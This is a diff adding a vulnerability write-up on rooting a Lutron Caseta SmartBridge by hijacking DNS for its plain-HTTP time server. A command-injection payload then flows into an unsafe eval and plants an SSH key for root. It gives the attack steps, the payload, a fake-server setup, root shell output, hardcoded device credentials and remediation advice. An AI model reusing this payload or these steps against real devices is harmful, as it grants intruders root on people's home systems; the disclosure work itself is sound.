@@ -339,3 +339,101 @@ in `sqlite_helper.sh` is the more severe issue.
 1. Replace `eval` with direct variable assignment: `printf -v "${__return_result}" '%s' "${sqlite_result}"`
 2. Add input validation in the Go LEAP handler for NTP endpoint (hostname/IP only)
 3. Quote all shell variables in sed expressions
+
+## Confirmed Vulnerability: Caseta SmartBridge — DNS Hijack → Root Shell via eval Injection
+
+**Severity**: Critical — CWE-78 (OS Command Injection) via DNS spoofing + unsafe `eval`
+
+### Summary
+
+The Caseta SmartBridge (L-BDG2-WH, firmware v08.25.17f000) can be rooted via a DNS hijack
+attack that exploits an unsafe `eval` in `getTimeFromURL.sh`. The bridge fetches time from
+`http://device-login.lutron.com` (plain HTTP, no TLS) as a backup when NTP fails. The
+server response is passed through `eval` without sanitization.
+
+### Differences from Phoenix (RA3) Attack
+
+| Aspect | Phoenix (RA3) | Caseta SmartBridge |
+|--------|--------------|-------------------|
+| **Entry point** | LEAP `UpdateRequest /service/ntpserver/1` | DNS hijack of `device-login.lutron.com` |
+| **Vulnerable code** | `sqlite_helper.sh:42` `eval` | `getTimeFromURL.sh:97` `eval` |
+| **Auth required** | LEAP integrator cert (pairing) | None (DNS spoofing) |
+| **Network position** | Any LEAP client on network | Must control DNS or be MITM |
+| **Trigger** | Automatic on NTP config change | Requires NTP failure + 10min wait |
+| **TLS** | N/A (DB write) | None — plain HTTP to time server |
+| **Prerequisites** | Paired LEAP cert | DNS control + NTP blocked |
+
+### Caseta Attack Chain
+
+1. **Block NTP** — firewall rule dropping UDP:123 from the bridge
+2. **DNS hijack** — point `device-login.lutron.com` to attacker's IP
+3. **Serve exploit** — HTTP server returns `$(COMMAND)` as response body
+4. **Wait** — bridge boots, chrony fails (NTP blocked), after ~10 minutes the
+   backup time fetch triggers `getTimeFromURL.sh`
+5. **eval fires** — `eval ${returnDateTime}=$(mkdir -p /root/.ssh && echo 'KEY' >> /root/.ssh/authorized_keys && echo 0)` executes as root
+
+### Vulnerable Code
+
+`usr/sbin/getTimeFromURL.sh` line 97:
+```sh
+eval ${returnDateTime}=${responseData}
+```
+
+`responseData` is the HTTP response body from the time server, parsed by `parseCurlOuput()`.
+The curl command has NO TLS verification (plain HTTP):
+```sh
+readonly CURL_POST_COMMAND="curl -w ${HTTP_CODE_STRING}=%{http_code} -X POST"
+```
+
+The time server URL is hardcoded in `/etc/lutron.d/timeUrls`:
+```json
+{"Username":"lutron-bridge", "Password":"Lutr0n@1", "Url":"http://device-login.lutron.com/api/v1/devices/utctime"}
+```
+
+### Proof of Concept (tested 2026-04-01 on v08.25.17f000)
+
+Exploit server (`tools/fake-time-server.py`):
+```python
+# Responds to POST /api/v1/devices/utctime with:
+PAYLOAD = "$(mkdir -p /root/.ssh && echo 'KEY' >> /root/.ssh/authorized_keys && echo 0)"
+```
+
+Setup:
+```bash
+# 1. DNS override: device-login.lutron.com -> attacker IP
+# 2. Block NTP: firewall drop UDP:123 from bridge
+# 3. Run server: sudo python3 tools/fake-time-server.py
+# 4. Power cycle bridge, wait ~10 minutes
+```
+
+Result:
+```
+$ ssh -i ~/.ssh/id_ed25519_lutron root@10.0.0.7
+uid=0(root) gid=0(root) groups=0(root)
+Lutron-04d0b591
+Linux Lutron-04d0b591 5.10.208-001-ts-armv7l #1 Thu Dec 4 09:36:05 UTC 2025 armv7l GNU/Linux
+```
+
+### Additional eval Injection in `curlscript.sh`
+
+The firmware update script `curlscript.sh` line 268 has the same pattern:
+```sh
+eval $returnValue="'$fieldData'"
+```
+Where `$fieldData` is parsed from the firmware update server's JSON response (`Url` field).
+This requires HTTPS MITM of `firmwareupdates.lutron.com` (TLS-verified against system
+CA bundle), making it harder to exploit than the HTTP time server path.
+
+### Scope
+
+The `getTimeFromURL.sh` vulnerability affects ALL Caseta SmartBridge and RA2 Select
+bridges running firmware v08.25.17f000 (and likely all versions with the backup time
+feature). The `curlscript.sh` vulnerability affects the firmware update path on all
+Lutron products using this shared shell script infrastructure.
+
+### Remediation
+
+1. Use HTTPS for the backup time server (not plain HTTP)
+2. Replace `eval` with safe assignment: `returnDateTime="${responseData}"`
+3. Validate the time server response is a numeric timestamp before use
+4. Remove hardcoded credentials from `timeUrls` config file
